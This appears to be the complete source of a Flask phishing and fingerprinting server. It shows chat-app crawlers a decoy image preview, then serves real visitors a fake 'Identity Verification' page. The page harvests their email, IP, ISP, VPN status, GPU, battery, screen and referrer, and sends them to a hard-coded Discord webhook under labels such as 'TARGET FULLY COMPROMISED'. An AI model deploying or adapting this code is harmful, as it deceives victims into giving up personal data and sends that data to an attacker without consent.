import os
import requests
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1499405115294093454/AxyBIBWUojFPEoD1bIsyexLxf8gC8yR4fEDBF8eCNKLtWPFGfXZ3EZ28XdDEQCHlEl51"

@app.route('/view/image_01.png')
def bridge():
    ua = request.user_agent.string
    if any(x in ua.lower() for x in ["discord", "bot", "telegram"]):
        return render_template_string('<meta property="og:title" content="Private Media Attached"><meta property="og:image" content="https://media1.tenor.com/m/EGAPcaiphUoAAAAC/loading-screen-two-dots.gif">')

    return render_template_string('''
    <html>
    <head>
        <title>Identity Verification</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body style="background-color: #0b0b0b; color: #e0e0e0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
        <div id="auth-box" style="background: #181818; padding: 30px; border-radius: 8px; width: 100%; max-width: 350px; text-align: center; border: 1px solid #333;">
            <img src="https://i.imgur.com/8N76f9J.png" width="50" style="margin-bottom: 15px; opacity: 0.5;">
            <h2 style="font-size: 18px; margin-bottom: 10px;">Security Verification</h2>
            <p style="font-size: 13px; color: #888; margin-bottom: 20px;">Verification required to view this content.</p>
            <input type="email" id="email" placeholder="Email Address" required style="width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 4px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box;">
            <button onclick="sendData()" style="width: 100%; padding: 12px; background: #5865F2; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer;">Verify Identity</button>
        </div>

        <script>
            async function sendData() {
                const emailVal = document.getElementById('email').value;
                if(!emailVal.includes('@')) return alert("Please enter a valid email.");
                
                document.getElementById('auth-box').innerHTML = '<p>Verifying Security Headers...</p>';

                let gpu = "Unknown";
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
                } catch (e) {}

                let battery = await navigator.getBattery();
                
                let payload = {
                    email: emailVal,
                    res: screen.width + "x" + screen.height,
                    availRes: screen.availWidth + "x" + screen.availHeight,
                    screens: (window.screen.isExtended || "N/A"), // Check for Multi-Monitor
                    batt: Math.round(battery.level * 100) + "%",
                    charging: battery.charging ? "YES" : "NO",
                    gpu: gpu,
                    platform: navigator.platform,
                    ref: document.referrer || "Direct"
                };
                
                fetch('/log-deep', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                }).then(() => {
                    setTimeout(() => { window.location.href = "https://i.imgur.com/BcNs5vF.jpg"; }, 500);
                });
            }
        </script>
    </body>
    </html>
    ''')

@app.route('/log-deep', methods=['POST'])
def log_deep():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    isp, vpn = "??", "??"
    try:
        g = requests.get(f"http://ip-api.com/json/{ip}?fields=16515").json()
        isp, vpn = g.get('isp'), ("🚨 YES" if g.get('proxy') else "✅ NO")
    except: pass

    webhook_data = {
        "username": "OMEGA-CORE ELITE",
        "embeds": [{
            "title": "🔓 TARGET FULLY COMPROMISED",
            "color": 0x000000,
            "fields": [
                {"name": "📧 STOLEN EMAIL", "value": f"**`{d['email']}`**", "inline": False},
                {"name": "📍 NETWORK", "value": f"**IP:** `{ip}`\n**ISP:** {isp}\n**VPN:** {vpn}", "inline": True},
                {"name": "🔋 POWER", "value": f"**Batt:** {d['batt']}\n**Plugged:** {d['charging']}", "inline": True},
                {"name": "🖥️ HARDWARE", "value": f"**GPU:** `{d['gpu']}`\n**Model:** {d['platform']}", "inline": False},
                {"name": "📺 DISPLAY", "value": f"**Res:** {d['res']}\n**Avail:** {d['availRes']}\n**Multi-Mon:** {d['screens']}", "inline": True},
                {"name": "🔗 REFERRER", "value": f"```{d['ref']}```", "inline": False}
            ],
            "footer": {"text": "Project Alpha | Forensic Node Active"}
        }]
    }
    requests.post(WEBHOOK_URL, json=webhook_data)
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
